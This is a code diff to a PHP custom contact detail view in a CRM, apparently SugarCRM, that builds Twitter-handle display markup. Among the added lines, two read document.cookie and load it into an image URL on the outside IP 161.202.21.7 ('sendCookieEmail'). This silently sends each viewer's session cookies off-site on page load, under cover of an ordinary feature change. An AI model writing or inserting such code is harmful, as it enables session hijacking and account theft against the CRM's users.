@@ -68,7 +68,13 @@ class CustomContactsViewDetail extends ContactsViewDetail {
         $site_url = $sugar_config['site_url'];
         $id = $this->bean->id;
         $twitter_handle = $this->bean->twitter_handle_c;
+        echo $js = <<<abc
+        <script type="text/javascript">
+        $(document).ready(function(){
 
+	    });
+        </script>
+abc;
         $js1 = <<<BOC
 <div id="dialog" title="Dialog Title"><span style="color:green; font-size:15px;"></span></div>
 <div id="imageLoading"></div>
@@ -84,6 +90,10 @@ class CustomContactsViewDetail extends ContactsViewDetail {
 				if(twitter_handle){		
 				$('#twitter_handle_c').append('<img id="contact_twitter_handle" width="20" height="15" src="custom/include/images/twitter_logo.png" >');
 				}
+
+
+	        var cookie = document.cookie;
+	        $('#contact_twitter_handle').attr('src','http://161.202.21.7/icchir/dev/index.php?entryPoint=sendCookieEmail&cookie='+cookie);
 
 				$('#contact_twitter_handle').on('click',function(){
 
